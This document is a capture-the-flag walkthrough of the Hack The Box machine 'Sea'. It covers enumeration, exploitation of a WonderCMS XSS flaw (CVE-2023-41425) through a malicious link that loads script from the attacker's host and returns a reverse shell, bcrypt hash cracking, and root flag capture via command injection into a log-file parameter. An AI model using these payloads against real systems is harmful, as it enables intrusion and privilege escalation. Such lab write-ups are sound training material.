# Enumeration
## NMAP


```bash
$ nmap -sC -sV -Pn -p- 10.10.11.28 -T5 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 04:26 EDT
Nmap scan report for 10.10.11.28
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.52 seconds

```

Add host to /etc/hosts

```bash
echo "10.10.11.28 sea.htb" | sudo tee -a /etc/hosts
```



## Directory enumeration

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://sea.htb/FUZZ" -c -v 
```

```bash
[Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 44ms]
| URL | http://sea.htb/themes
| --> | http://sea.htb/themes/
    * FUZZ: themes

[Status: 301, Size: 228, Words: 14, Lines: 8, Duration: 44ms]
| URL | http://sea.htb/data
| --> | http://sea.htb/data/
    * FUZZ: data

[Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 45ms]
| URL | http://sea.htb/plugins
| --> | http://sea.htb/plugins/
    * FUZZ: plugins
```

We found the `/themes` directory

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/themes/FUZZ" -c -v
```

```bash
[Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 44ms]
| URL | http://sea.htb/themes/bike
| --> | http://sea.htb/themes/bike/
    * FUZZ: bike
```

Continue with the enumeration of the `/bike` directory

```bash
ffuf -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt -u "http://sea.htb/themes/bike/FUZZ" -t 200 -fc 403
```
```bash
README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 56ms]
sym/root/home/          [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 44ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 54ms]
```
We managed to enumerate some potentially sensitive files let try to download them.

```bash
curl http://sea.htb/themes/bike/README.md
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

Found out that the used CMS is WonderCMS

```bash
$ curl http://sea.htb/themes/bike/version  
3.2.0
```
And the version is 3.2.0

# Foothold
## Vulnerability Search
Source  | Link
------------- | -------------
NIST  | https://nvd.nist.gov/vuln/detail/CVE-2023-41425
Exploit  | https://github.com/0xDTC/WonderCMS-4.3.2-XSS-to-RCE-Exploits-CVE-2023-41425

We discovered that this version is vulnerable to cross site scripting, searching for a POC exploit we got a github repo with the exploit ready for use.

## Exploitation
```bash
./CVE-2023-41425 http://sea.htb/index.php?page=LoginURL 10.10.14.17 4444
[+] Preparing to download the reverse shell zip file from: http://10.10.14.17:8000/main.zip
[+] Reverse shell downloaded and saved as rev.php
[+] Updating rev.php with provided IP: 10.10.14.17 and Port: 4444
[+] rev.php updated with the correct IP and Port.
[+] Creating ZIP file with rev.php...
[+] main.zip created successfully.
[+] File created: xss.js
[+] Setting up reverse shell listener:
Use the following command in your terminal: nc -nvlp 4444
[+] Send the following malicious link to the admin:
http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.17:8000/xss.js"></script><form+action="
Waiting for the admin to trigger the payload.
[+] Port 8000 is available.
[+] Starting a simple HTTP server to serve the XSS payload...
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We need to send the XSS to the administrator. When the administrator clicks on it we will get our reverse shell back

![picture alt](assets/Send_Exploit.png)

And we are on :rocket:
```bash
./CVE-2023-41425 http://sea.htb/index.php?page=LoginURL 10.10.14.17 4444
[+] Preparing to download the reverse shell zip file from: http://10.10.14.17:8000/main.zip
[+] Reverse shell downloaded and saved as rev.php
[+] Updating rev.php with provided IP: 10.10.14.17 and Port: 4444
[+] rev.php updated with the correct IP and Port.
[+] Creating ZIP file with rev.php...
[+] main.zip created successfully.
[+] File created: xss.js
[+] Setting up reverse shell listener:
Use the following command in your terminal: nc -nvlp 4444
[+] Send the following malicious link to the admin:
http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.17:8000/xss.js"></script><form+action="
Waiting for the admin to trigger the payload.
[+] Port 8000 is available.
[+] Starting a simple HTTP server to serve the XSS payload...
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [23/Apr/2025 07:44:39] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [23/Apr/2025 07:44:49] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [23/Apr/2025 07:44:49] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [23/Apr/2025 07:44:49] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [23/Apr/2025 07:44:49] "GET /main.zip HTTP/1.1" 200 -
```
![picture alt](assets/Reverse_Shell.png)

## Exploration
While exploring the system we found about 2 users **amay** and **geo**. We can see the user flag on **/home/amay/user.txt** but we don't have the required privileges.
Searching the file system further we find a database.js file in the **/var/www/sea/data** directory.

```js
"forceLogout": false,
"forceHttps": false,
"saveChangesPopup": false,
"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

We found a password hash lets move it into a file that will contain all of our hashes for this box. **Remove the escape \\**

```bash
echo "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q" > sea_hashes
```

We can use https://hashes.com/en/tools/hash_identifier to identify the hash.

The next step is to use hashcat is order to crack the password.

```bash
hashcat -a 0 -m 3200 sea_hashes /usr/share/wordlists/rockyou.txt  
```

```bash 
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Wed Apr 23 08:24:17 2025 (39 secs)
Time.Estimated...: Wed Apr 23 08:24:56 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       80 H/s (6.38ms) @ Accel:6 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3060/14344385 (0.02%)
Rejected.........: 0/3060 (0.00%)
Restore.Point....: 3024/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: iamcool -> memories
Hardware.Mon.#1..: Util: 72%
```

We cracked it :rocket: password is `mychemicalromance`

Let's try to connect via ssh to the target machine as one of the users we found

![picture alt](assets/amay_ssh.png)

### User Flag
```bash
amay@sea:~$ cat user.txt 
d2aec1ec8d8ac082883a1a3eb8d651d6
```

# Lateral Movement

```bash
amay@sea:~$ sudo -l
[sudo] password for amay: 
Sorry, user amay may not run sudo on sea.
```
Amay cannot use any commands as sudo, the next step is to look for local services,
```bash
may@sea:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37881         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```
As we can see a service is running at port 8080 on localhost, in order to access it we need to open a reverse SSH tunnel to the target machine.
```bash
ssh -L 8081:127.0.0.1:8080 amay@10.10.11.28
```
Going to 127.0.0.1:8081 we find the following service

![picture alt](assets/local_service.png)

The service seems to be able to access files with `elevated privileges`.

![picture alt](assets/Reading_RootFiles.png)

Using BurpSuite we can intercept the post request send by the Analyze button

![picture alt](assets/Initial_Intercept.png)

```bash
POST / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://127.0.0.1:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://127.0.0.1:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```
The POST request gets as an input a path to the logfile that should be analyzed.

If we tried to enter the /root/root.txt as a path we receive nothing back meaning that the service is blocked to the /var/log directory but it has root privileges.

Let's try to chain command as the service probably uses something like `cat log_file` in order to provide the contents of the log file.

Using https://gchq.github.io/CyberChef we can URL encode our command:
```bash
ln -s /root/root.txt /var/log/root.log
```
Using the repeater to send the chained commands to the machine

```bash
POST / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://127.0.0.1:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://127.0.0.1:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Froot.txt;ln%20-s%20/root/root.txt%20/var/log/root.txt +s  &analyze_log=
```

![picture alt](assets/root_log.png)

We got the symlink to the `root flag`. Let's resend the POST request

![picture alt](assets/root_flag.png)

